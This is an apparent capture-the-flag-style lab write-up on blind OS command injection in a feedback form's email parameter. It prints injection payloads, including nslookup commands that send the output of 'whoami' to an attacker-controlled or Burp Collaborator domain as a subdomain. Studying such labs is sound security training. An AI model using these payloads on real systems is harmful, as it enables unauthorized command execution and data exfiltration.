# Blind OS command injection with out-of-band data exfiltration

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](./images/aaa55b41f52d_001.png)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup 8mvkjln6evqts94q7vwt31eziqoic90y.oastify.com;#
```

![](./images/aaa55b41f52d_002.png)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

Once we’ve confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

{% hint style="info" %}
💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
{% endhint %}



```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.

```bash
; nslookup `whoami`.8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
or
; nslookup $(whoami).8mvkjln6evqts94q7vwt31eziqoic90y.burpcollaborator.net; #
```

![](./images/aaa55b41f52d_003.png)

The username is shown in the DNS request:

![](./images/aaa55b41f52d_004.png)
